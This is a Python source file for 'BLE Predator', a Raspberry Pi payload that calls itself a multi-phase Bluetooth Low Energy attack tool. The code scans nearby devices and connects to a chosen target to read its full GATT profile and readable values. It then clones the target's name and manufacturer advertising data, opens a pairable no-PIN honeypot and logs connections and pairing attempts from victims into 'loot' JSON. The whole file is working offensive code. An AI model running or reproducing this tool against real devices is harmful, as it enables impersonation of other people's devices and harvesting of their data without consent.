#!/usr/bin/env python3
"""
RaspyJack Payload -- BLE Predator (Scan → Recon → Honeypot)
============================================================

Multi-phase BLE attack tool ported from HaleHound's BlePredator.

Phases
------
  1. SCAN      Discover nearby BLE devices (bleak BleakScanner)
  2. RECON     Connect to target, enumerate full GATT profile
  3. HONEYPOT  Clone target identity, log incoming connections

Dashboards (LEFT/RIGHT)
------------------------
  1. Device list / phase status
  2. GATT profile (after recon)
  3. Honeypot interaction log

Controls
--------
  OK    Advance phase / stop current
  U/D   Scroll
  L/R   Switch dashboard
  KEY1  Toggle auto-advance
  KEY2  Export loot JSON
  KEY3  Exit

Loot: /root/Raspyjack/loot/BLEPredator/
"""

import os
import sys
import time
import json
import asyncio
import threading
import subprocess
import re
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_bt_interface

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

HCI_DEV = None
LOOT_DIR = "/root/Raspyjack/loot/BLEPredator"
ROW_H = 12
ROWS_VISIBLE = 7

PHASE_IDLE = "IDLE"
PHASE_SCAN = "SCAN"
PHASE_RECON = "RECON"
PHASE_HONEYPOT = "HONEYPOT"

lock = threading.Lock()
phase = PHASE_IDLE
auto_advance = False
status_msg = "Idle"
_running = True

devices = {}
selected_idx = 0
scroll_pos = 0
target_addr = None

gatt_profile = {}
gatt_lines = []
gatt_scroll = 0

honeypot_log = []
hp_scroll = 0
_btmon_proc = None
_orig_name = ""

dashboard = 0
DASHBOARDS = 3


def _hci_up():
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "up"],
                   capture_output=True, timeout=5)


def _hci_reset():
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "reset"],
                   capture_output=True, timeout=5)


def _get_adapter_name():
    try:
        r = subprocess.run(["bluetoothctl", "show"], capture_output=True,
                           text=True, timeout=5)
        for line in r.stdout.splitlines():
            if "Alias:" in line:
                return line.split("Alias:", 1)[1].strip()
    except Exception:
        pass
    return "raspberrypi"


def _set_adapter_name(name):
    subprocess.run(["bluetoothctl", "system-alias", name],
                   capture_output=True, timeout=5)


def _sorted_devices():
    with lock:
        items = list(devices.values())
    items.sort(key=lambda d: d["rssi"], reverse=True)
    return items


async def _bleak_scan(timeout=8):
    from bleak import BleakScanner
    found = await BleakScanner.discover(timeout=timeout, return_adv=True)
    results = []
    for d, adv in found.values():
        mfr = {}
        if adv.manufacturer_data:
            for cid, data in adv.manufacturer_data.items():
                mfr[cid] = data.hex()
        svcs = list(adv.service_uuids) if adv.service_uuids else []
        results.append({
            "addr": d.address.upper(),
            "name": adv.local_name or d.name or "",
            "rssi": adv.rssi if adv.rssi is not None else -99,
            "manufacturer_data": mfr,
            "service_uuids": svcs,
        })
    return results


def _scan_thread():
    global phase, status_msg
    _hci_up()
    time.sleep(0.3)

    with lock:
        status_msg = "Scanning..."

    try:
        results = asyncio.run(_bleak_scan(8))
        now_str = datetime.now().strftime("%H:%M:%S")
        with lock:
            for r in results:
                addr = r["addr"]
                if addr in devices:
                    prev = devices[addr]
                    devices[addr] = {
                        **prev, **r,
                        "name": r["name"] or prev["name"],
                        "last_seen": now_str,
                        "count": prev["count"] + 1,
                    }
                else:
                    devices[addr] = {
                        **r,
                        "first_seen": now_str,
                        "last_seen": now_str,
                        "count": 1,
                    }
            status_msg = f"Found {len(results)}"

        if auto_advance:
            devs = _sorted_devices()
            if devs:
                with lock:
                    global target_addr
                    target_addr = devs[0]["addr"]
                    phase = PHASE_RECON
                    status_msg = "Auto→Recon"
                _recon_work()
                return
    except Exception as exc:
        with lock:
            status_msg = str(exc)[:18]

    with lock:
        if phase == PHASE_SCAN:
            phase = PHASE_IDLE
            status_msg = "Scan done"


async def _bleak_recon(addr):
    from bleak import BleakClient
    profile = {"address": addr, "services": []}
    async with BleakClient(addr, timeout=15) as client:
        for svc in client.services:
            svc_info = {
                "uuid": str(svc.uuid),
                "characteristics": [],
            }
            for char in svc.characteristics:
                char_info = {
                    "uuid": str(char.uuid),
                    "properties": char.properties,
                    "value": None,
                    "descriptors": [str(d.uuid) for d in char.descriptors],
                }
                if "read" in char.properties:
                    try:
                        raw = await client.read_gatt_char(char.uuid)
                        char_info["value"] = raw.hex()
                    except Exception:
                        char_info["value"] = "<error>"
                svc_info["characteristics"].append(char_info)
            profile["services"].append(svc_info)
    return profile


def _build_gatt_lines(profile):
    lines = [f"Target: {profile.get('address', '?')[:17]}"]
    for svc in profile.get("services", []):
        uuid_short = svc["uuid"][-8:]
        lines.append(f"SVC {uuid_short}")
        for ch in svc.get("characteristics", []):
            props = ",".join(ch["properties"])[:10]
            ch_short = ch["uuid"][-8:]
            lines.append(f" C {ch_short} {props}")
            if ch.get("value") and ch["value"] != "<error>":
                val_preview = ch["value"][:16]
                lines.append(f"   ={val_preview}")
            for desc in ch.get("descriptors", []):
                lines.append(f"   D {desc[-8:]}")
    if not profile.get("services"):
        lines.append("No services found")
    return lines


def _recon_work():
    global phase, status_msg, gatt_profile, gatt_lines
    addr = target_addr
    with lock:
        status_msg = f"Recon {addr[-5:]}"

    try:
        profile = asyncio.run(_bleak_recon(addr))
        with lock:
            gatt_profile = profile
            gatt_lines = _build_gatt_lines(profile)
            status_msg = f"Recon OK"

        if auto_advance:
            with lock:
                phase = PHASE_HONEYPOT
                status_msg = "Auto→HP"
            _honeypot_work()
            return
    except Exception as exc:
        with lock:
            status_msg = str(exc)[:18]

    with lock:
        if phase == PHASE_RECON:
            phase = PHASE_IDLE
            status_msg = "Recon done"


def _recon_thread():
    _recon_work()


def _start_btmon():
    global _btmon_proc
    try:
        _btmon_proc = subprocess.Popen(
            ["sudo", "btmon"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            text=True, bufsize=1)
    except Exception:
        _btmon_proc = None


def _stop_btmon():
    global _btmon_proc
    if _btmon_proc:
        try:
            _btmon_proc.terminate()
            _btmon_proc.wait(timeout=3)
        except Exception:
            try:
                _btmon_proc.kill()
            except Exception:
                pass
        _btmon_proc = None


def _monitor_btmon():
    global _running
    if not _btmon_proc or not _btmon_proc.stdout:
        return
    while _running:
        with lock:
            if phase != PHASE_HONEYPOT:
                break
        try:
            line = _btmon_proc.stdout.readline()
            if not line:
                break
            line = line.strip()
            ts = datetime.now().strftime("%H:%M:%S")
            entry = None
            if "Connect Complete" in line or "Connection Complete" in line:
                entry = {"time": ts, "type": "CONNECT", "detail": line[-30:]}
            elif "Disconnect Complete" in line:
                entry = {"time": ts, "type": "DISCONNECT", "detail": line[-30:]}
            elif "PIN Code Request" in line or "Confirm passkey" in line:
                entry = {"time": ts, "type": "PAIR_ATTEMPT", "detail": line[-30:]}
            elif "Read Request" in line or "Read Response" in line:
                entry = {"time": ts, "type": "GATT_READ", "detail": line[-30:]}
            elif "Write Request" in line or "Write Command" in line:
                entry = {"time": ts, "type": "GATT_WRITE", "detail": line[-30:]}
            if entry:
                with lock:
                    honeypot_log.append(entry)
        except Exception:
            break


def _honeypot_work():
    global phase, status_msg, _orig_name
    with lock:
        dev = devices.get(target_addr, {})
    clone_name = dev.get("name") or "BLE Device"
    _orig_name = _get_adapter_name()
    _set_adapter_name(clone_name)

    subprocess.run(["bluetoothctl", "discoverable", "on"],
                   capture_output=True, timeout=5)
    subprocess.run(["bluetoothctl", "pairable", "on"],
                   capture_output=True, timeout=5)
    subprocess.run(["bluetoothctl", "agent", "NoInputNoOutput"],
                   capture_output=True, timeout=5)
    subprocess.run(["bluetoothctl", "default-agent"],
                   capture_output=True, timeout=5)

    mfr = dev.get("manufacturer_data", {})
    if mfr:
        cid, data_hex = next(iter(mfr.items()))
        cid_le = f"{cid & 0xff:02x} {(cid >> 8) & 0xff:02x}"
        adv_data = f"{cid_le} {data_hex}"
        subprocess.run(
            ["sudo", "hcitool", "-i", HCI_DEV, "cmd", "0x08", "0x0008",
             str(len(adv_data.split())), *adv_data.split()],
            capture_output=True, timeout=5)

    with lock:
        status_msg = f"HP:{clone_name[:8]}"

    _start_btmon()
    _monitor_btmon()


def _honeypot_thread():
    _honeypot_work()


def _stop_honeypot():
    global phase
    _stop_btmon()
    subprocess.run(["bluetoothctl", "discoverable", "off"],
                   capture_output=True, timeout=5)
    subprocess.run(["bluetoothctl", "pairable", "off"],
                   capture_output=True, timeout=5)
    if _orig_name:
        _set_adapter_name(_orig_name)
    _hci_reset()


def _export_json():
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"predator_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "target": target_addr,
            "scan_results": list(devices.values()),
            "gatt_profile": gatt_profile,
            "honeypot_log": list(honeypot_log),
        }
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2, default=str)
    return path


PHASE_COLORS = {
    PHASE_IDLE: "#888888",
    PHASE_SCAN: "#2196F3",
    PHASE_RECON: "#FF9800",
    PHASE_HONEYPOT: "#F44336",
}


def _draw_screen():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    with lock:
        cur_phase = phase
        msg = status_msg
        cur_dash = dashboard
        sel = selected_idx
        sp = scroll_pos
        auto = auto_advance
        n_dev = len(devices)
        g_lines = list(gatt_lines)
        g_scroll = gatt_scroll
        hp_log = list(honeypot_log)
        h_scroll = hp_scroll
        tgt = target_addr

    d.rectangle((0, 0, 127, 13), fill="#111")
    phase_clr = PHASE_COLORS.get(cur_phase, "#888")
    auto_tag = " [A]" if auto else ""
    d.text((2, 1), f"PREDATOR {cur_phase}{auto_tag}", font=font, fill=phase_clr)

    y = 15

    if cur_dash == 0:
        d.text((2, y), f"Devs:{n_dev} {msg[:12]}", font=font, fill="#888")
        y += 13
        if tgt:
            d.text((2, y), f"TGT:{tgt[-8:]}", font=font, fill="#FFAA00")
            y += 12

        devs = _sorted_devices()
        start = sp
        end = min(sp + ROWS_VISIBLE - (1 if tgt else 0), len(devs))
        for i in range(start, end):
            dev = devs[i]
            prefix = ">" if i == sel else " "
            marker = "*" if dev["addr"] == tgt else " "
            name = (dev["name"] or dev["addr"][-8:])[:10]
            rssi = dev["rssi"]
            clr = "#FFAA00" if i == sel else ("#FF5555" if dev["addr"] == tgt else "#CCCCCC")
            d.text((2, y), f"{prefix}{marker}{name} {rssi}dB", font=font, fill=clr)
            y += ROW_H

        if not devs:
            d.text((2, y), "OK to start scan", font=font, fill="#555")

        d.rectangle((0, 116, 127, 127), fill="#111")
        d.text((2, 117), "OK:Go K1:Auto K3:X", font=font, fill="#AAA")

    elif cur_dash == 1:
        d.text((2, y), "GATT Profile", font=font, fill="#FF9800")
        y += 13
        if g_lines:
            end = min(g_scroll + 8, len(g_lines))
            for i in range(g_scroll, end):
                d.text((2, y), g_lines[i][:22], font=font, fill="#CCCCCC")
                y += ROW_H
        else:
            d.text((2, y), "Run Recon first", font=font, fill="#555")

        d.rectangle((0, 116, 127, 127), fill="#111")
        d.text((2, 117), "U/D=Scroll L/R=Dash", font=font, fill="#AAA")

    elif cur_dash == 2:
        d.text((2, y), f"Honeypot Log ({len(hp_log)})", font=font, fill="#F44336")
        y += 13
        if hp_log:
            end = min(h_scroll + 8, len(hp_log))
            for i in range(h_scroll, end):
                e = hp_log[i]
                txt = f"{e['time']} {e['type'][:8]}"
                d.text((2, y), txt[:22], font=font, fill="#CCCCCC")
                y += ROW_H
        else:
            d.text((2, y), "No events yet", font=font, fill="#555")

        d.rectangle((0, 116, 127, 127), fill="#111")
        d.text((2, 117), "U/D=Scroll L/R=Dash", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


def main():
    global scroll_pos, selected_idx, status_msg, dashboard
    global phase, auto_advance, target_addr, HCI_DEV
    global gatt_scroll, hp_scroll

    HCI_DEV = select_bt_interface(LCD, font, PINS, GPIO)
    if not HCI_DEV:
        GPIO.cleanup()
        return 1

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 10), "BLE PREDATOR", font=font, fill="#F44336")
    d.text((4, 28), "Scan > Recon > Clone", font=font, fill="#888")
    d.text((4, 46), "OK=Next phase", font=font, fill="#666")
    d.text((4, 58), "K1=Auto  K2=Export", font=font, fill="#666")
    d.text((4, 70), "L/R=Dashboard  K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.0)

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "LEFT":
                with lock:
                    dashboard = (dashboard - 1) % DASHBOARDS
                time.sleep(0.25)

            elif btn == "RIGHT":
                with lock:
                    dashboard = (dashboard + 1) % DASHBOARDS
                time.sleep(0.25)

            elif btn == "KEY1":
                with lock:
                    auto_advance = not auto_advance
                    status_msg = f"Auto:{'ON' if auto_advance else 'OFF'}"
                time.sleep(0.25)

            elif btn == "KEY2":
                path = _export_json()
                with lock:
                    status_msg = "Exported"
                time.sleep(0.3)

            elif dashboard == 0:
                if btn == "OK":
                    with lock:
                        cur_phase = phase
                    if cur_phase == PHASE_IDLE:
                        with lock:
                            phase = PHASE_SCAN
                        threading.Thread(target=_scan_thread, daemon=True).start()
                    elif cur_phase == PHASE_SCAN:
                        with lock:
                            phase = PHASE_IDLE
                            status_msg = "Stopped"
                    elif cur_phase == PHASE_RECON:
                        with lock:
                            phase = PHASE_IDLE
                            status_msg = "Stopped"
                    elif cur_phase == PHASE_HONEYPOT:
                        _stop_honeypot()
                        with lock:
                            phase = PHASE_IDLE
                            status_msg = "HP stopped"
                    else:
                        devs = _sorted_devices()
                        if devs and 0 <= selected_idx < len(devs):
                            with lock:
                                target_addr = devs[selected_idx]["addr"]
                                phase = PHASE_RECON
                            threading.Thread(target=_recon_thread, daemon=True).start()
                    time.sleep(0.3)

                elif btn == "UP":
                    with lock:
                        selected_idx = max(0, selected_idx - 1)
                        if selected_idx < scroll_pos:
                            scroll_pos = selected_idx
                    time.sleep(0.2)

                elif btn == "DOWN":
                    devs = _sorted_devices()
                    with lock:
                        selected_idx = min(max(0, len(devs) - 1), selected_idx + 1)
                        if selected_idx >= scroll_pos + ROWS_VISIBLE:
                            scroll_pos = selected_idx - ROWS_VISIBLE + 1
                    time.sleep(0.2)

            elif dashboard == 1:
                if btn == "UP":
                    with lock:
                        gatt_scroll = max(0, gatt_scroll - 1)
                    time.sleep(0.2)
                elif btn == "DOWN":
                    with lock:
                        gatt_scroll = min(gatt_scroll + 1, max(0, len(gatt_lines) - 8))
                    time.sleep(0.2)
                elif btn == "OK":
                    with lock:
                        cur_phase = phase
                    if cur_phase == PHASE_IDLE and target_addr:
                        with lock:
                            phase = PHASE_HONEYPOT
                        threading.Thread(target=_honeypot_thread, daemon=True).start()
                    time.sleep(0.3)

            elif dashboard == 2:
                if btn == "UP":
                    with lock:
                        hp_scroll = max(0, hp_scroll - 1)
                    time.sleep(0.2)
                elif btn == "DOWN":
                    with lock:
                        hp_scroll = min(hp_scroll + 1, max(0, len(honeypot_log) - 8))
                    time.sleep(0.2)

            _draw_screen()
            time.sleep(0.05)

    finally:
        with lock:
            cur_phase = phase
        if cur_phase == PHASE_HONEYPOT:
            _stop_honeypot()
        _hci_reset()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
